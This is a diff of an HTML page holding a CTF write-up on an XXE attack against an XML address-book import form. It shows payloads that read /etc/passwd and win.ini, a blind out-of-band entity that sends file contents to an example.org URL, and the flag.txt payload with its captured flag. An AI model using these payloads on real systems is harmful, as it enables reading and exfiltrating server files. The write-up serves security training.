@@ -8,7 +8,9 @@
     
         <meta name="keywords" content="security,web,writeups,ctf" />
     
-    <meta name="description" content="InformationsVersion
+    <meta name="description" content="Informations
+Version
+
 
 
 By
@@ -25,18 +27,21 @@ Creation
 
 
 CTF
+
 Name : European Cyber Week CTF Quals 2016
 Website : challenge-ecw.fr
 Type : Online
 Format : Jeopardy - Student
 
-DescriptionN.A.
-S">
+Description
+N.">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ECW - 150 - Carnet d'adresses - Web">
 <meta property="og:url" content="http://rawsec.ml/en/ECW-2016-carnet-dadresse/index.html">
 <meta property="og:site_name" content="RawSec">
-<meta property="og:description" content="InformationsVersion
+<meta property="og:description" content="Informations
+Version
+
 
 
 By
@@ -53,18 +58,21 @@ Creation
 
 
 CTF
+
 Name : European Cyber Week CTF Quals 2016
 Website : challenge-ecw.fr
 Type : Online
 Format : Jeopardy - Student
 
-DescriptionN.A.
-S">
+Description
+N.">
 <meta property="og:image" content="http://rawsec.ml/images/ctf.png">
 <meta property="og:updated_time" content="2017-02-07T18:23:37.632Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ECW - 150 - Carnet d'adresses - Web">
-<meta name="twitter:description" content="InformationsVersion
+<meta name="twitter:description" content="Informations
+Version
+
 
 
 By
@@ -81,13 +89,14 @@ Creation
 
 
 CTF
+
 Name : European Cyber Week CTF Quals 2016
 Website : challenge-ecw.fr
 Type : Online
 Format : Jeopardy - Student
 
-DescriptionN.A.
-S">
+Description
+N.">
 <meta name="twitter:image" content="http://rawsec.ml/images/ctf.png">
     
 
@@ -247,7 +256,9 @@ ga('send', 'pageview');
         
         
         <div class="article-entry" itemprop="articleBody">
-            <h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
+            <h2>Informations</h2>
+<h3>Version</h3>
+<table>
 <thead>
 <tr>
 <th>By</th>
@@ -263,45 +274,48 @@ ga('send', 'pageview');
 </tr>
 </tbody>
 </table>
-<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
+<h3>CTF</h3>
+<ul>
 <li><strong>Name</strong> : European Cyber Week CTF Quals 2016</li>
 <li><strong>Website</strong> : <a href="https://challenge-ecw.fr/" target="_blank" rel="external">challenge-ecw.fr</a></li>
 <li><strong>Type</strong> : Online</li>
 <li><strong>Format</strong> : Jeopardy - Student</li>
 </ul>
-<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>N.A.</p>
-<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>This one is a XML External Entity ([XXE][xxe]) attack and Out-Of-Band (OOB) channel exfiltration is not working.</p>
+<h3>Description</h3>
+<p>N.A.</p>
+<h2>Solution</h2>
+<p>This one is a XML External Entity ([XXE][xxe]) attack and Out-Of-Band (OOB) channel exfiltration is not working.</p>
 <p><a href="https://www.gracefulsecurity.com/xml-external-entity-injection-xxe-vulnerabilities/" target="_blank" rel="external">xxe</a></p>
 <p>We are given the following form:</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">contacts</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Jean Dupont<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>00 11 22 33 44<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">adress</span>&gt;</span>42 rue CTF<span class="tag">&lt;/<span class="name">adress</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">zipcode</span>&gt;</span>42000<span class="tag">&lt;/<span class="name">zipcode</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">city</span>&gt;</span>ECW<span class="tag">&lt;/<span class="name">city</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Jack Dupont<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>01 02 03 04 05<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">contacts</span>&gt;</span></div></pre></td></tr></table></figure>
+<p><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">contacts</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Jean Dupont<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>00 11 22 33 44<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">adress</span>&gt;</span>42 rue CTF<span class="tag">&lt;/<span class="name">adress</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">zipcode</span>&gt;</span>42000<span class="tag">&lt;/<span class="name">zipcode</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">city</span>&gt;</span>ECW<span class="tag">&lt;/<span class="name">city</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Jack Dupont<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>01 02 03 04 05<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">contacts</span>&gt;</span></div></pre></td></tr></table></figure></p>
 <p>And the following answer confirming the well formated XML request:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Création du fichier ./MNfloDfo.xml</div><div class="line"></div><div class="line">Import du fichier :</div><div class="line"></div><div class="line">    Importation de &apos;Jean Dupont&apos; dans le carnet d&apos;adresses</div><div class="line">    Importation de &apos;Jack Dupont&apos; dans le carnet d&apos;adresses</div><div class="line"></div><div class="line">Suppression du fichier ./MNfloDfo.xml</div></pre></td></tr></table></figure>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Création du fichier ./MNfloDfo.xml</div><div class="line"></div><div class="line">Import du fichier :</div><div class="line"></div><div class="line">    Importation de &apos;Jean Dupont&apos; dans le carnet d&apos;adresses</div><div class="line">    Importation de &apos;Jack Dupont&apos; dans le carnet d&apos;adresses</div><div class="line"></div><div class="line">Suppression du fichier ./MNfloDfo.xml</div></pre></td></tr></table></figure></p>
 <p>We should be able to leak data into the answer banner.</p>
 <p>Confirmation that entities are interpreted:</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE contacts</span></div><div class="line">[&lt;!ENTITY xxe "XXE vuln"&gt;]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">contacts</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;t<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>00 11 22 33 44<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">adress</span>&gt;</span>42 rue CTF<span class="tag">&lt;/<span class="name">adress</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">zipcode</span>&gt;</span>42000<span class="tag">&lt;/<span class="name">zipcode</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">city</span>&gt;</span>ECW<span class="tag">&lt;/<span class="name">city</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Jack Dupont<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>01 02 03 04 05<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">contacts</span>&gt;</span></div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Création du fichier ./J2tuDR8g.xml</div><div class="line"></div><div class="line">Import du fichier :</div><div class="line"></div><div class="line">    Importation de &apos;XXE vulnt&apos; dans le carnet d&apos;adresses</div><div class="line">    Importation de &apos;Jack Dupont&apos; dans le carnet d&apos;adresses</div><div class="line"></div><div class="line">Suppression du fichier ./J2tuDR8g.xml</div></pre></td></tr></table></figure>
-<p>Nice that’s working so try to leak some files:</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE contacts</span></div><div class="line">[&lt;!ENTITY xxe SYSTEM "http://example.org/test"&gt;]&gt;</div></pre></td></tr></table></figure>
-<p>=&gt; doesn’t work</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span></div></pre></td></tr></table></figure>
-<p>=&gt; doesn’t work</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" &gt;]&gt;</span></div></pre></td></tr></table></figure>
-<p>=&gt; doesn’t work</p>
-<p>[…] and we tried a lot of logical filename on various operating systems.</p>
-<p>But how did we find out the right? The challenge required no logic but only guessing …</p>
+<p><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE contacts</span></div><div class="line">[&lt;!ENTITY xxe "XXE vuln"&gt;]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">contacts</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;t<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>00 11 22 33 44<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">adress</span>&gt;</span>42 rue CTF<span class="tag">&lt;/<span class="name">adress</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">zipcode</span>&gt;</span>42000<span class="tag">&lt;/<span class="name">zipcode</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">city</span>&gt;</span>ECW<span class="tag">&lt;/<span class="name">city</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Jack Dupont<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>01 02 03 04 05<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">contacts</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Création du fichier ./J2tuDR8g.xml</div><div class="line"></div><div class="line">Import du fichier :</div><div class="line"></div><div class="line">    Importation de &apos;XXE vulnt&apos; dans le carnet d&apos;adresses</div><div class="line">    Importation de &apos;Jack Dupont&apos; dans le carnet d&apos;adresses</div><div class="line"></div><div class="line">Suppression du fichier ./J2tuDR8g.xml</div></pre></td></tr></table></figure></p>
+<p>Nice that's working so try to leak some files:</p>
+<p><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE contacts</span></div><div class="line">[&lt;!ENTITY xxe SYSTEM "http://example.org/test"&gt;]&gt;</div></pre></td></tr></table></figure></p>
+<p>=&gt; doesn't work</p>
+<p><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span></div></pre></td></tr></table></figure></p>
+<p>=&gt; doesn't work</p>
+<p><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" &gt;]&gt;</span></div></pre></td></tr></table></figure></p>
+<p>=&gt; doesn't work</p>
+<p>[...] and we tried a lot of logical filename on various operating systems.</p>
+<p>But how did we find out the right? The challenge required no logic but only guessing ...</p>
 <p>I firstly thought the banner was useless because no file was leaked in it. So I thought it was some blind xxe:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE contacts [ &lt;!ENTITY % pe SYSTEM &quot;http://example.org/xxe_file&quot;&gt; %pe; %param1; ]&gt;</div><div class="line">&lt;contacts&gt;</div><div class="line">  &lt;contact&gt;</div><div class="line">    &lt;name&gt;&amp;external;&lt;/name&gt;</div><div class="line">    [...]</div></pre></td></tr></table></figure>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE contacts [ &lt;!ENTITY % pe SYSTEM &quot;http://example.org/xxe_file&quot;&gt; %pe; %param1; ]&gt;</div><div class="line">&lt;contacts&gt;</div><div class="line">  &lt;contact&gt;</div><div class="line">    &lt;name&gt;&amp;external;&lt;/name&gt;</div><div class="line">    [...]</div></pre></td></tr></table></figure></p>
 <p><code>xxe_file</code>:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % payload SYSTEM &quot;file:///etc/passwd&quot;&gt;</div><div class="line">&lt;!ENTITY % param1 &quot;&lt;!ENTITY external SYSTEM &apos;http://example.org/log_xxe?data=%payload;&apos;&gt;&quot;&gt;</div></pre></td></tr></table></figure>
-<p>And a tried a lot…</p>
-<p>But no, in fact no files were leakable exept <code>flag.txt</code>. It was impossible to find out it was just guessing because rules and description didn’t mention any convention.</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % payload SYSTEM &quot;file:///etc/passwd&quot;&gt;</div><div class="line">&lt;!ENTITY % param1 &quot;&lt;!ENTITY external SYSTEM &apos;http://example.org/log_xxe?data=%payload;&apos;&gt;&quot;&gt;</div></pre></td></tr></table></figure></p>
+<p>And a tried a lot...</p>
+<p>But no, in fact no files were leakable exept <code>flag.txt</code>. It was impossible to find out it was just guessing because rules and description didn't mention any convention.</p>
 <p>I passed hours on days to craft sophishticated blind xxe requests and it was only a very easy xxe but filename had to be guessed, it was easy to think that xxe was not working as others files was not leaked.</p>
 <p>Realistic challenge should have be better.</p>
 <p>But indeed some people find it realy easily as <code>flag.txt</code> can be common in CTF.</p>
-<p>I insist on the fact that’s is only CTF guessing, in real life this never occurs.</p>
+<p>I insist on the fact that's is only CTF guessing, in real life this never occurs.</p>
 <p>Here was the easy XXE :</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE contacts</span></div><div class="line">[&lt;!ENTITY xxe SYSTEM "flag.txt"&gt;]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">contacts</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>00 11 22 33 44<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">adress</span>&gt;</span>42 rue CTF<span class="tag">&lt;/<span class="name">adress</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">zipcode</span>&gt;</span>42000<span class="tag">&lt;/<span class="name">zipcode</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">city</span>&gt;</span>ECW<span class="tag">&lt;/<span class="name">city</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Jack Dupont<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>01 02 03 04 05<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">contacts</span>&gt;</span></div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Création du fichier ./WDpFYEM5.xml</div><div class="line"></div><div class="line">Import du fichier :</div><div class="line"></div><div class="line">    Importation de &apos;ECW&#123;8dd72b9b3095380de595d734492d69c9&#125; &apos; dans le carnet d&apos;adresses</div><div class="line">    Importation de &apos;Jack Dupont&apos; dans le carnet d&apos;adresses</div><div class="line"></div><div class="line">Suppression du fichier ./WDpFYEM5.xml</div></pre></td></tr></table></figure>
+<p><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE contacts</span></div><div class="line">[&lt;!ENTITY xxe SYSTEM "flag.txt"&gt;]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">contacts</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>00 11 22 33 44<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">adress</span>&gt;</span>42 rue CTF<span class="tag">&lt;/<span class="name">adress</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">zipcode</span>&gt;</span>42000<span class="tag">&lt;/<span class="name">zipcode</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">city</span>&gt;</span>ECW<span class="tag">&lt;/<span class="name">city</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Jack Dupont<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>01 02 03 04 05<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">contacts</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Création du fichier ./WDpFYEM5.xml</div><div class="line"></div><div class="line">Import du fichier :</div><div class="line"></div><div class="line">    Importation de &apos;ECW&#123;8dd72b9b3095380de595d734492d69c9&#125; &apos; dans le carnet d&apos;adresses</div><div class="line">    Importation de &apos;Jack Dupont&apos; dans le carnet d&apos;adresses</div><div class="line"></div><div class="line">Suppression du fichier ./WDpFYEM5.xml</div></pre></td></tr></table></figure></p>
 
         </div>
         <footer class="article-footer">
@@ -309,7 +323,7 @@ ga('send', 'pageview');
 
 
 
-    <a data-url="http://rawsec.ml/en/ECW-2016-carnet-dadresse/" data-id="cizepeog400lc2rfstmfc4wr5" class="article-share-link"><i class="fa fa-share"></i>Share</a>
+    <a data-url="http://rawsec.ml/en/ECW-2016-carnet-dadresse/" data-id="cizoihhdp00fkmefs433mmozq" class="article-share-link"><i class="fa fa-share"></i>Share</a>
 <script>
     (function ($) {
         $('body').on('click', function() {
@@ -445,20 +459,20 @@ ga('send', 'pageview');
         
 <nav id="article-nav">
     
-        <a href="/en/ECW-2016-ave-cesar/" id="article-nav-newer" class="article-nav-link-wrap">
+        <a href="/en/SchoolCTF-2016-100-forensics-n4M3/" id="article-nav-newer" class="article-nav-link-wrap">
         <strong class="article-nav-caption">newer</strong>
         <p class="article-nav-title">
         
-            ECW - 50 - Ave, César! - Cryptography
+            School CTF - 100 - n4M3 - Forensics
         
         </p>
         <i class="icon fa fa-chevron-right" id="icon-chevron-right"></i>
     </a>
     
     
-        <a href="/en/ECW-2016-dilemme/" id="article-nav-older" class="article-nav-link-wrap">
+        <a href="/en/ECW-2016-ave-cesar/" id="article-nav-older" class="article-nav-link-wrap">
         <strong class="article-nav-caption">older</strong>
-        <p class="article-nav-title">ECW - 150 - Dilemme - Misc</p>
+        <p class="article-nav-title">ECW - 50 - Ave, César! - Cryptography</p>
         <i class="icon fa fa-chevron-left" id="icon-chevron-left"></i>
         </a>
     
@@ -497,26 +511,6 @@ ga('send', 'pageview');
                     <li>
                         
                         <div class="item-thumbnail">
-                            <a href="/en/WhiteHat-Challenge-2017-20-For001-Forensics/" class="thumbnail">
-    
-    
-        <span style="background-image:url(/images/ctf.png)" alt="WhiteHat Challenge 01 - 20 - For001 - Forensics" class="thumbnail-image"></span>
-    
-    
-</a>
-
-                        </div>
-                        
-                        <div class="item-inner">
-                            <p class="item-category"><a class="article-category-link" href="/categories/security/">security</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/security/writeups/">writeups</a></p>
-                            <p class="item-title"><a href="/en/WhiteHat-Challenge-2017-20-For001-Forensics/" class="title">WhiteHat Challenge 01 - 20 - For001 - Forensics</a></p>
-                            <p class="item-date"><time datetime="2017-02-26T23:00:00.000Z" itemprop="datePublished">Monday 27 February 2017 (2017-02-27)</time></p>
-                        </div>
-                    </li>
-                
-                    <li>
-                        
-                        <div class="item-thumbnail">
                             <a href="/en/NeverLAN-CTF-2017-write-ups/" class="thumbnail">
     
     
@@ -530,6 +524,26 @@ ga('send', 'pageview');
                         <div class="item-inner">
                             <p class="item-category"><a class="article-category-link" href="/categories/security/">security</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/security/writeups/">writeups</a></p>
                             <p class="item-title"><a href="/en/NeverLAN-CTF-2017-write-ups/" class="title">NeverLAN CTF 2017 - Write-ups</a></p>
+                            <p class="item-date"><time datetime="2017-02-26T23:00:00.000Z" itemprop="datePublished">Monday 27 February 2017 (2017-02-27)</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/en/WhiteHat-Challenge-2017-20-For001-Forensics/" class="thumbnail">
+    
+    
+        <span style="background-image:url(/images/ctf.png)" alt="WhiteHat Challenge 01 - 20 - For001 - Forensics" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/security/">security</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/security/writeups/">writeups</a></p>
+                            <p class="item-title"><a href="/en/WhiteHat-Challenge-2017-20-For001-Forensics/" class="title">WhiteHat Challenge 01 - 20 - For001 - Forensics</a></p>
                             <p class="item-date"><time datetime="2017-02-26T23:00:00.000Z" itemprop="datePublished">Monday 27 February 2017 (2017-02-27)</time></p>
                         </div>
                     </li>
